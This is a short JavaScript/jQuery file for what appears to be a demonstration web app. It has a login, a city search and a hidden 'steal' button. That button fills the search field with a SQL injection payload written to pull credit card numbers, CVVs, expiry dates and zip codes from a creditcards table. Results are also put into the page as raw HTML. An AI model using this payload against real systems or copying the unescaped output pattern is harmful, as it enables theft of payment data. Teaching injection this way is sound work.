const injectionQuery = "';select concat('number: ', number, '<br/>cvv: ', cvv, '<br/>expdate: ', expmonth, '/', expyear, '<br/>zip: ', zip) as alias from creditcards where number <> '";

$(document).ready(function() {
    $("#login_button").click(function() {
        $("#login_page").removeClass("open");
        $("#dashboard_page").addClass("open");
    });

    $("#search_button").click(function() {
        $("#dashboard_page").addClass("searched");
        $.get("/api/aliases", { city: $("#city").val() }, function(data) {
            $("#results").empty();
            for (let alias of data) {
                $("#results").append(generateResult(alias));
            }
        });
    });

    $("#logout").click(function() {
        $("#login_page").addClass("open");
        $("#dashboard_page").removeClass("open");
        setTimeout(function() {
            $("#results").empty();
            $("#dashboard_page").removeClass("searched");
        }, 400);
    });

    $("#advanced").click(function() {
        $("#steal_button").addClass('visible');
    });

    $("#steal_button").click(function() {
        $("#city").val(injectionQuery);
    });
});

function generateResult(alias) {
    return `<div class=\"result\">${alias}</div>`;
}